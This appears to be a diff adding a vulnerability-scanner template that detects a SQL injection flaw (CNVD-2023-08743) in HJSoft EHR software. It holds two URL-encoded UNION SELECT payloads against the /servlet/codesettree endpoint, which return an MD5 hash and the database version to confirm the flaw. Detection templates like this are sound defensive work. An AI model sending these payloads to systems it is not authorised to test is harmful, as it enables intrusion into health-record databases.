@@ -1,0 +1,52 @@
+id: hjsoft-ehr-sql-injection-CNVD-2023-08743
+info:
+  name: HJSoft EHR SQL Injection
+  author: guichen.guo
+  severity: high
+  description: |
+    SQL Injection vulnerability in HJSoft EHR software, allowing attackers to execute arbitrary SQL queries.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2023-08743
+variables:
+  s1: "{{rand_int(1, 9)}}"
+  s2: "{{rand_int(1, 9)}}"
+  s3: "{{rand_int(1, 9)}}"
+  s4: "{{rand_int(1, 9)}}"
+  s5: "{{rand_int(1, 9)}}"
+  s6: "{{hex_encode(to_string(s1))}}"
+  s7: "{{hex_encode(to_string(s2))}}"
+  s8: "{{hex_encode(to_string(s3))}}"
+  s9: "{{hex_encode(to_string(s4))}}"
+  s10: "{{hex_encode(to_string(s5))}}"
+  s11: "{{rand_text_alpha(20)}}"
+http:
+  - id: r0
+    method: GET
+    path:
+      - /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27~31~27~2csys~2efn~5fsqlvarbasetostr~28HashBytes~28~27MD~35~27~2c~27~{{s6}}~{{s7}}~{{s8}}~{{s9}}~{{s10}}~27~29~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<TreeNode id"
+          - "{{md5(concat(s1, s2, s3, s4, s5))}}"
+  - id: r1
+    method: GET
+    path:
+      - /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27{{s11}}~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<TreeNode id=\"{{s11}}"
+          - "codesetid={{s11}}"
